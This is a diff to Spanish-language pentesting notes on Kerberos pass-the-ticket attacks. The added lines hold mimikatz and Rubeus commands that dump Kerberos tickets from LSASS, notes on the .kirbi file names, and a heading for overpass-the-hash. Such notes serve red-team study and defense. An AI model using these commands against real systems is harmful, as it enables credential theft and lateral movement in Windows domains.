@@ -6,6 +6,18 @@ Para llevar adelante este ataque necesitamos un ticket válido de kerberos. Pued
 
 ####Buscando tickets de kerberos:
 ##Windows
-En windows los tickets de kerberos son guardados en el LSASS
+En windows los tickets de kerberos son guardados en el LSASS. Para extraer todos los tickets necesitamos privilegios de admin.
+
 #Extraerlos con mimikatz
-mimikatz.exe privilege::debug "sekurlsa::tickets /export"
+mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
+dir *.kirbi
+
+Los tickets que terminan con "$" son de la cuenta de la computadora y son los necesarios para transaccionar con el AD.
+los tickets se componen por : [randomvalue]-username@service-domain.local.kirbi
+
+#extraerlos con Rubeus:
+Rubeus.exe dump /nowrap
+
+#####Crear nuestros propios tickets:
+
+##Pass the key / overpass the hash:
